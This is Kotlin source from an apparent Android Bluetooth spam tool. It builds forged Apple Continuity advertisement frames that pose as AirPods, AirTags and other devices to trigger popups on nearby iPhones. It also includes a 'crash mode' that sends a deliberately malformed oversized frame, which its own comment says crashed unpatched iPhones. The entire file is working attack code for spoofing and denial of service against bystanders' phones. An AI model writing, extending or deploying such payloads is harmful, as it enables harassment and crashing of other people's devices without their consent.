package com.droid.flippy

import java.util.HashMap
import java.util.Random

/**
 * Apple Continuity advertisement payload builders (shared by the whole-mode
 * [ContinuitySpam] and the per-item [ContinuitySingleSpam]).
 *
 * Wire format is type-length-value: e.g. proximity pairing is
 * `07 19 <25 bytes>`. The length byte MUST match the bytes that follow —
 * iOS silently ignores malformed frames (this is why the old "Device" list,
 * which declared 0x19 but sent only 9 bytes, did nothing on iPhones while
 * the correctly-sized Action Modal frames worked).
 */
internal object ContinuityPayloads {

    const val COLOR_KEY_DEFAULT = "00"

    private val DEVICE_COLORS = HashMap<String, Array<String>>().apply {
        put("0E20", arrayOf("00"))
        put("0220", arrayOf("00"))
        put("0F20", arrayOf("00"))
        put("1320", arrayOf("00"))
        put("1420", arrayOf("00"))
        put("2420", arrayOf("00"))
        put("0055", arrayOf("00"))
        put("0030", arrayOf("00"))
        put("0A20", arrayOf("00", "02", "03", "0F", "11"))
        put("1020", arrayOf("00", "01"))
        put("0620", arrayOf("00", "01", "06", "07", "08", "09", "0E", "0F", "12", "13", "14", "15", "1D", "20", "21", "22", "23", "25", "2A", "2E", "3D", "3E", "3F", "40", "5B", "5C"))
        put("0320", arrayOf("00", "01", "0B", "0C", "0D", "12", "13", "14", "15", "17"))
        put("0B20", arrayOf("00", "02", "03", "04", "05", "06", "0B", "0D"))
        put("0C20", arrayOf("00", "01"))
        put("1120", arrayOf("00", "01", "02", "03", "04", "06"))
        put("0520", arrayOf("00", "01", "02", "05", "1D", "25"))
        put("0920", arrayOf("00", "01", "02", "03", "18", "19", "25", "26", "27", "28", "29", "42", "43"))
        put("1720", arrayOf("00", "01"))
        put("1220", arrayOf("00", "01", "02", "03", "04", "05", "06", "07", "08", "09"))
        put("1620", arrayOf("00", "01", "02", "03", "04"))
        put("2520", arrayOf("00", "01", "02", "03"))
        put("2620", arrayOf("00", "01", "02", "03", "04"))
        put("2F20", arrayOf("00", "01", "02", "03"))
    }

    fun pickRandomColorForDevice(deviceIdNoPrefix: String, rand: Random): String {
        return DEVICE_COLORS[deviceIdNoPrefix]?.let { it[rand.nextInt(it.size)] }
            ?: COLOR_KEY_DEFAULT
    }

    fun toHexByte(b: Int): String = String.format("%02X", b and 0xFF)

    fun randomHexBytes(length: Int, rand: Random): String {
        val bytes = ByteArray(length)
        rand.nextBytes(bytes)
        return bytes.joinToString("") { String.format("%02X", it.toInt() and 0xFF) }
    }

    /**
     * Proximity-pairing frame (`07 19` + 25 bytes): prefix, model, status,
     * battery levels, lid counter, color and a random tail, matching real
     * captures (`07 19 01 <model> 55 ...`).
     *
     * NOTE: this used to omit the prefix byte (`07 19 <model>...`), which
     * shifted the model bytes and made iOS ignore every DEVICE single-item
     * (e.g. AirTag from the sub-list) while the whole-mode "Device" button
     * still appeared to work via its NOTYOURDEVICE half.
     */
    fun devicePayload(deviceIdHex: String, rand: Random, fixedColorHex: String? = null): ByteArray {
        val isAirTag = deviceIdHex == "0055" || deviceIdHex == "0030"
        val prefix = if (isAirTag) "05" else "01"
        val color = if (prefix == "01") {
            (fixedColorHex ?: pickRandomColorForDevice(deviceIdHex, rand))
        } else {
            "00"
        }
        val buds = toHexByte((rand.nextInt(10) shl 4) + rand.nextInt(10))
        val charging = toHexByte(((rand.nextInt(8) % 8) shl 4) + (rand.nextInt(10) % 10))
        val lid = toHexByte(rand.nextInt(256))
        val payloadHex = buildString {
            append("07")
            append("19")
            append(prefix)
            append(deviceIdHex)
            append("55")
            append(buds)
            append(charging)
            append(lid)
            append(color)
            append("00")
            append(randomHexBytes(16, rand))
        }
        return Helper.convertHexToByteArray(payloadHex)
    }

    /**
     * "Not your device"/AirTag frame (`07 19` + 25 bytes). AirTags use the
     * `05` prefix; other people's devices use `01`.
     */
    fun proximityPairPayload(prefixHex: String, deviceIdHex: String, colorHex: String?, rand: Random): ByteArray {
        val buds = toHexByte((rand.nextInt(10) shl 4) + rand.nextInt(10))
        val charging = toHexByte(((rand.nextInt(8) % 8) shl 4) + (rand.nextInt(10) % 10))
        val lid = toHexByte(rand.nextInt(256))

        val isAirTag = deviceIdHex == "0055" || deviceIdHex == "0030"
        val prefix = if (isAirTag) "05" else prefixHex
        val color = if (prefix == "01") (colorHex ?: COLOR_KEY_DEFAULT) else "00"

        val payloadHex = buildString {
            append("07")
            append("19")
            append(prefix)
            append(deviceIdHex)
            append("55")
            append(buds)
            append(charging)
            append(lid)
            append(color)
            append("00")
            append(randomHexBytes(16, rand))
        }
        return Helper.convertHexToByteArray(payloadHex)
    }

    /**
     * Nearby-action frame (`0F 05` + 5 bytes). Crash mode appends 6 extra
     * bytes on purpose — the malformed oversized frame is what used to
     * crash old unpatched iPhones; modern iOS ignores it.
     */
    fun nearbyActionPayload(actionHex: String, crashMode: Boolean, rand: Random): ByteArray {
        var flag = "C0"
        when (actionHex) {
            "21" -> flag = "40"
            "20" -> if (rand.nextBoolean()) flag = "BF"
            "09" -> if (rand.nextBoolean()) flag = "40"
        }
        val authTag = randomHexBytes(3, rand)
        var payloadHex = buildString {
            append("0F")
            append("05")
            append(flag)
            append(actionHex)
            append(authTag)
        }
        if (crashMode) {
            payloadHex += "000010" + randomHexBytes(3, rand)
        }
        return Helper.convertHexToByteArray(payloadHex)
    }
}
